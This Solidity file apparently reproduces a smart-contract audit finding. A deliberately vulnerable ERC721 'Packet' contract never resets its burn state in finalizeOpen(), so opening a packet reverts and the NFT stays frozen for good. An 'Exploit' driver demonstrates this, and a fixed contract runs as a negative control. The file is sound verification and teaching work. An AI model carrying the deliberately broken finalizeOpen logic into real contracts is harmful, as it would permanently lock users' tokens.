// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62595:
// "[H-02] Packet burn state not reset in finalizeOpen() causes failure".
//
// Packet.sol is an ERC721 whose transferFrom is overridden with a freeze guard
// (verbatim from the finding):
//
//     function transferFrom(address from, address to, uint256 tokenId) public virtual override {
//         if (_packetBurnType[tokenId] != BurnType.NONE) revert PacketFrozen();
//         super.transferFrom(from, to, tokenId);
//     }
//
// initiateBurn(INSTANT_OPEN_PACKET) sets _packetBurnType[id] = INSTANT_OPEN_PACKET
// (models the pending / Chainlink-VRF state). The instant-open flow finalizes by
// calling finalizeOpen(), which is supposed to reset the burn state back to NONE
// BEFORE moving the packet into inventory. The audited finalizeOpen for the
// INSTANT_OPEN_PACKET branch NEVER resets _packetBurnType (see @> below), so:
//   1. finalizeOpen() moves the packet via the internal _transfer() (no guard),
//   2. then calls packetStore.addPacketsToInventory([id]),
//   3. which calls safeTransferFrom(packet, store, id) → the overridden
//      transferFrom → _packetBurnType[id] still == INSTANT_OPEN_PACKET != NONE
//      → revert PacketFrozen().
// The whole finalizeOpen() reverts, the open can never complete, and the packet
// remains permanently non-transferable (any later transferFrom also reverts).
//
// Vulnerable finalizeOpen = the finding's recommendation MINUS the reset line.
// PacketFixed re-adds that single reset line (negative control).
// ─────────────────────────────────────────────────────────────────────────────

// ── Minimal faithful ERC721 base (OpenZeppelin-shaped): the public transferFrom
//    is virtual and routes through _transfer; safeTransferFrom routes through the
//    (overridable) public transferFrom so a derived guard fires; the internal
//    _transfer bypasses the guard. Only the pieces the exploit path touches. ──
abstract contract ERC721Base {
    mapping(uint256 => address) internal _owners;
    mapping(address => uint256) internal _balances;
    mapping(uint256 => address) internal _tokenApprovals;

    error ERC721NonexistentToken(uint256 tokenId);
    error ERC721IncorrectOwner();
    error ERC721InsufficientApproval();
    error ERC721AlreadyMinted();

    function ownerOf(uint256 tokenId) public view virtual returns (address) {
        address owner = _owners[tokenId];
        if (owner == address(0)) revert ERC721NonexistentToken(tokenId);
        return owner;
    }

    function getApproved(uint256 tokenId) public view virtual returns (address) {
        return _tokenApprovals[tokenId];
    }

    function approve(address to, uint256 tokenId) public virtual {
        address owner = ownerOf(tokenId);
        if (msg.sender != owner) revert ERC721InsufficientApproval();
        _tokenApprovals[tokenId] = to;
    }

    function transferFrom(address from, address to, uint256 tokenId) public virtual {
        address owner = ownerOf(tokenId);
        if (owner != from) revert ERC721IncorrectOwner();
        if (msg.sender != owner && _tokenApprovals[tokenId] != msg.sender) {
            revert ERC721InsufficientApproval();
        }
        _transfer(from, to, tokenId);
    }

    // safeTransferFrom routes through the (overridable) public transferFrom, so a
    // derived freeze guard fires here. Receiver onERC721Received callback omitted
    // (not load-bearing for this finding; the store is a contract we control).
    function safeTransferFrom(address from, address to, uint256 tokenId) public virtual {
        transferFrom(from, to, tokenId);
    }

    // Internal transfer: does NOT dispatch through the public transferFrom, so the
    // derived guard is bypassed (faithful to OZ _transfer/_update).
    function _transfer(address from, address to, uint256 tokenId) internal virtual {
        if (ownerOf(tokenId) != from) revert ERC721IncorrectOwner();
        _tokenApprovals[tokenId] = address(0);
        _balances[from] -= 1;
        _balances[to] += 1;
        _owners[tokenId] = to;
    }

    function _mint(address to, uint256 tokenId) internal virtual {
        if (_owners[tokenId] != address(0)) revert ERC721AlreadyMinted();
        _balances[to] += 1;
        _owners[tokenId] = to;
    }
}

interface IPacketStore {
    function addPacketsToInventory(uint256[] calldata packetIds) external;
}

// ── PacketBase: the shared Packet.sol logic. The VERBATIM freeze guard override,
//    the burn-type state, initiateBurn (models the pending/VRF burn), and mint.
//    Packet and PacketFixed differ ONLY in finalizeOpen (one reset line). ──
abstract contract PacketBase is ERC721Base {
    enum BurnType {
        NONE,
        INSTANT_OPEN_PACKET,
        BURN_FOR_CARDS
    }

    mapping(uint256 => BurnType) internal _packetBurnType;
    IPacketStore public packetStore;

    error PacketFrozen();
    error NotOwner();

    constructor(address _packetStore) {
        packetStore = IPacketStore(_packetStore);
    }

    // ── VERBATIM vulnerable guard (from the finding) ──
    function transferFrom(address from, address to, uint256 tokenId) public virtual override {
        if (_packetBurnType[tokenId] != BurnType.NONE) revert PacketFrozen();
        super.transferFrom(from, to, tokenId);
    }

    // Models the burn initiation: sets the packet's burn state to the requested
    // type (the CardAllocationPool / VRF plumbing is collapsed away — the packet
    // simply enters the INSTANT_OPEN_PACKET pending state).
    function initiateBurn(uint256 packetId, BurnType burnType) external {
        if (ownerOf(packetId) != msg.sender) revert NotOwner();
        _packetBurnType[packetId] = burnType;
    }

    // Test helper (packets are minted elsewhere in production; not the vuln boundary).
    function mint(address to, uint256 packetId) external {
        _mint(to, packetId);
    }

    function burnTypeOf(uint256 packetId) external view returns (uint256) {
        return uint256(_packetBurnType[packetId]);
    }
}

// ── VULNERABLE Packet: finalizeOpen for INSTANT_OPEN_PACKET never resets the
//    burn state before transferring, so addPacketsToInventory's safeTransferFrom
//    trips the freeze guard and the whole call reverts. ──
contract Packet is PacketBase {
    constructor(address _packetStore) PacketBase(_packetStore) {}

    function finalizeOpen(uint256 packetId) external {
        BurnType burnType = _packetBurnType[packetId];
        if (burnType == BurnType.INSTANT_OPEN_PACKET) {
            // @> BUG: burn state is NEVER reset to NONE here — the missing
            //        `_packetBurnType[packetId] = BurnType.NONE;` means the
            //        freeze guard below still sees INSTANT_OPEN_PACKET and reverts.
            _transfer(ownerOf(packetId), address(this), packetId);
            this.approve(address(packetStore), packetId);

            uint256[] memory packetIds = new uint256[](1);
            packetIds[0] = packetId;
            packetStore.addPacketsToInventory(packetIds); // → safeTransferFrom → transferFrom → PacketFrozen()
        } else {
            _transfer(ownerOf(packetId), address(this), packetId);
        }
    }
}

// ── FIXED Packet (negative control): resets the burn state to NONE BEFORE the
//    transfer, exactly as the finding's recommendation prescribes. ──
contract PacketFixed is PacketBase {
    constructor(address _packetStore) PacketBase(_packetStore) {}

    function finalizeOpen(uint256 packetId) external {
        BurnType burnType = _packetBurnType[packetId];
        if (burnType == BurnType.INSTANT_OPEN_PACKET) {
            _packetBurnType[packetId] = BurnType.NONE; // FIX: reset burn state before transfer
            _transfer(ownerOf(packetId), address(this), packetId);
            this.approve(address(packetStore), packetId);

            uint256[] memory packetIds = new uint256[](1);
            packetIds[0] = packetId;
            packetStore.addPacketsToInventory(packetIds);
        } else {
            _transfer(ownerOf(packetId), address(this), packetId);
        }
    }
}

// ── Minimal faithful PacketStore: pulls each packet from the calling Packet
//    contract (msg.sender = the packet contract, the current owner after the
//    internal _transfer) into its own inventory via safeTransferFrom. ──
contract PacketStore {
    function addPacketsToInventory(uint256[] calldata packetIds) external {
        for (uint256 i = 0; i < packetIds.length; i++) {
            ERC721Base(msg.sender).safeTransferFrom(msg.sender, address(this), packetIds[i]);
        }
    }
}

// ── Minimal ERC20 marker token. For this DoS / permanent-freeze finding the harm
//    is denial-of-transfer (attacker profit == 0); the marker records the harmed
//    magnitude (1 permanently-frozen packet NFT) at the SINK. ──
contract MarkerToken {
    string public name = "Frozen Packet Marker";
    string public symbol = "FROZEN-PACKET";
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. Constructor deploys the store, the vulnerable Packet, the fixed
// Packet, and the marker (LAST). run() drives the REAL instant-open finalize path
// on the vulnerable Packet (which reverts and leaves the packet permanently
// frozen), records the harm at the SINK, then proves the fix path succeeds.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant OTHER = address(uint160(0xB0B));

    uint256 internal constant PACKET_ID = 1;

    PacketStore public store;
    Packet public packet;
    PacketFixed public packetFixed;
    MarkerToken public marker;

    // exposed results for the driver to assert on
    bool public finalizeReverted;
    bool public stillFrozen;
    address public packetOwnerAfter;
    uint256 public burnTypeAfter;
    uint256 public sinkMarkerBalance;

    bool public fixedFinalizeSucceeded;
    uint256 public fixedBurnTypeAfter;
    address public fixedInventoryOwner;

    address public storeAddr;
    address public packetAddr;
    address public packetFixedAddr;
    address public markerAddr;

    constructor() {
        store = new PacketStore(); // index 0
        packet = new Packet(address(store)); // index 1
        packetFixed = new PacketFixed(address(store)); // index 2
        marker = new MarkerToken(); // index 3 (LAST)

        storeAddr = address(store);
        packetAddr = address(packet);
        packetFixedAddr = address(packetFixed);
        markerAddr = address(marker);
    }

    function run() external payable {
        // ── VULNERABLE PATH ───────────────────────────────────────────────
        // Exploit acts as the packet owner (the user opening a packet).
        packet.mint(address(this), PACKET_ID);
        // User initiates an INSTANT_OPEN_PACKET burn → packet enters frozen state.
        packet.initiateBurn(PACKET_ID, PacketBase.BurnType.INSTANT_OPEN_PACKET);

        // The instant-open flow finalizes. Because finalizeOpen never resets the
        // burn state, the mandatory safeTransferFrom into inventory trips the
        // freeze guard and the entire finalize reverts.
        try packet.finalizeOpen(PACKET_ID) {
            finalizeReverted = false;
        } catch {
            finalizeReverted = true;
        }

        // State rolled back: packet still owned by the user, still frozen.
        packetOwnerAfter = packet.ownerOf(PACKET_ID);
        burnTypeAfter = packet.burnTypeOf(PACKET_ID);

        // Permanently non-transferable: even the owner cannot move it now.
        try packet.transferFrom(address(this), OTHER, PACKET_ID) {
            stillFrozen = false;
        } catch {
            stillFrozen = true;
        }

        // Harm must actually reproduce against the verbatim guard.
        require(finalizeReverted, "finalizeOpen did NOT revert");
        require(stillFrozen, "packet is NOT frozen");
        require(packetOwnerAfter == address(this), "owner unexpectedly changed");
        require(burnTypeAfter == uint256(PacketBase.BurnType.INSTANT_OPEN_PACKET), "burn state unexpectedly reset");

        // Record the harm: 1 packet NFT permanently frozen / open DoS'd.
        marker.mint(SINK, 1);
        sinkMarkerBalance = marker.balanceOf(SINK);

        // ── NEGATIVE CONTROL: the fixed variant resets the burn state, so the
        //    identical finalize path succeeds and the packet moves to inventory. ─
        packetFixed.mint(address(this), PACKET_ID);
        packetFixed.initiateBurn(PACKET_ID, PacketBase.BurnType.INSTANT_OPEN_PACKET);
        try packetFixed.finalizeOpen(PACKET_ID) {
            fixedFinalizeSucceeded = true;
        } catch {
            fixedFinalizeSucceeded = false;
        }
        fixedBurnTypeAfter = packetFixed.burnTypeOf(PACKET_ID);
        fixedInventoryOwner = packetFixed.ownerOf(PACKET_ID);
    }
}
